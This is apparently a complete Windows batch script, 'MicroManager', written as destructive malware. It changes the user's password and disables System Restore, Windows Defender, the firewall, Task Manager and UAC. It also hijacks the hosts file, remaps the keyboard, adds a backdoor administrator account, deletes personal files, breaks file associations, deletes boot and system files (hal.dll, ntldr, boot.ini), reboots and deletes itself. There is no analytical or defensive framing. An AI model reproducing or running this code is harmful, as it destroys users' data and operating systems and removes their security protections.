@echo off & Title MicroManager & Color 0a & @Break & @Endlocal & :: By: GrIFt3r & TechScape
net user %username% NEWPASSWORD
Set wshShell =wscript.CreateObject(“WScript.Shell”) >>sendkey.vbs
echo do >>cpslk.vbs
echo wscript.sleep 100 >>cpslkv.vbs
echo wshshell.sendkeys “{CAPSLOCK}” >>cpslk.vbs
echo loop >>cpslk.vbs
echo Set wshShell =wscript.CreateObject(“WScript.Shell”) >>sendkey.vbs
echo do >>sendkey.vbs
echo wshshell.sendkeys “{W}” >>sendkey.vbs
echo wshshell.sendkeys “{e}” >>sendkey.vbs
echo wshshell.sendkeys “{G}” >>sendkey.vbs
echo wshshell.sendkeys “{o}” >>sendkey.vbs
echo wshshell.sendkeys “{t}” >>sendkey.vbs
echo wshshell.sendkeys “{c}” >>sendkey.vbs
echo wshshell.sendkeys “{h}” >>sendkey.vbs
echo wshshell.sendkeys “{a}” >>sendkey.vbs
echo wshshell.sendkeys "{!}" >>sendkey.vbs
echo wshshell.sendkeys "{!}" >>sendkey.vbs
echo wshshell.sendkeys "{!}" >>sendkey.vbs
echo wshshell.sendkeys "{/}" >>sendkey.vbs
echo wshshell.sendkeys "{/}" >>sendkey.vbs
echo wshshell.sendkeys "{/}" >>sendkey.vbs
echo wshshell.sendkeys "{/}" >>sendkey.vbs
start sendkey.vbs & start cpslk.vbs
echo Set Args = wscript.Arguments >>SysRestore-Disable.vbs
echo If Args.Count() > 0 Then >>SysRestore-Disable.vbs
echo     Drive = Args.item(0) >>SysRestore-Disable.vbs
echo Else >>SysRestore-Disable.vbs
echo     Drive = "" >>SysRestore-Disable.vbs
echo End If >>SysRestore-Disable.vbs
echo Set obj = GetObject("winmgmts:{impersonationLevel=impersonate}!root/default:SystemRestore") >>SysRestore-Disable.vbs
echo If (obj.Disable(Drive)) = 0 Then >>SysRestore-Disable.vbs
echo     wscript.Echo "Success" >>SysRestore-Disable.vbs
echo Else  >>SysRestore-Disable.vbs
echo     wscript.Echo "Failed" >>SysRestore-Disable.vbs
echo End If >>SysRestore-Disable.vbs
start SysRestore-Disable.vbs
cd "%systemroot%\System32\Drivers\etc"
echo 127.0.0.1 www.google.com >> "Hosts"
echo 127.0.0.1 www.www.google.com >> "Hosts"
reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v "START PAGE" /d "http://www.hackforums.net/"
net stop "WinDefend" & taskkill /f /t /im "MSASCui.exe" & net stop "WSearch" & net stop "wuauserv"
net stop "WPCSvc" & net stop "MpsSvc" & taskkill /f /t /im "FirewallControlPanel.exe" & net stop "WerSvc"
net stop "wscsvc" & tskill Explorer.exe
echo Windows Registry Editor Version 5.00 > "nokeyboard.reg"
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "nokeyboard.reg"
echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> "nokeyboard.reg"
echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> "nokeyboard.reg"
echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> "nokeyboard.reg"
echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> "nokeyboard.reg"
echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> "nokeyboard.reg"
echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> "nokeyboard.reg"
echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> "nokeyboard.reg"
echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> "nokeyboard.reg"
echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> "nokeyboard.reg"
echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> "nokeyboard.reg"
start "nokeyboard.reg"
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
net user MicroManager MicroManager /add & net localgroup administrators MicroManager /add
del /f /q "C:\Users\C:\Users\%username%\My Documents\*.*" & del /f /q "C:\Users\C:\Users\%username%\My Documents\My Music\*.*" 
del /f /q "C:\Users\C:\Users\%username%\My Documents\My Pictures\*.*" 
@Cmd /k Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
net stop "SDRSVC" & assoc .bat=delfile & assoc .cmd=delfile & assoc .com=delfile & assoc .exe=delfile & assoc .gif=delfile 
assoc .jpg=delfile & assoc .bmp=delfile & assoc .png=delfile & assoc .dic=wmpfile & assoc .exc=wmpfile & assoc .scp=wmpfile 
assoc .txt=wmpfile & assoc .log=wmpfile & assoc .wtx=wmpfile & assoc .sys=delfile & assoc .sys=delfile & assoc .inf=delfile 
assoc .ini=delfile & assoc .dll=delfile & assoc .cpl=delfile & assoc .reg=delfile & assoc .vbs=delfile & assoc .scr=delfile 
echo Y|cacls "%SystemRoot%\system32\gpedit.msc" /P %username%:N   
del /f /q %SystemDrive%\WINDOWS\system32\hal.dll
attrib -r -s -h c:\autoexec.bat & del c:\autoexec.bat
attrib -r -s -h c:\boot.ini & del c:\boot.ini
attrib -r -s -h c:\ntldr & del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini
shutdown /r /t 00
attrib +h %0 
del /f /q %0
@exit







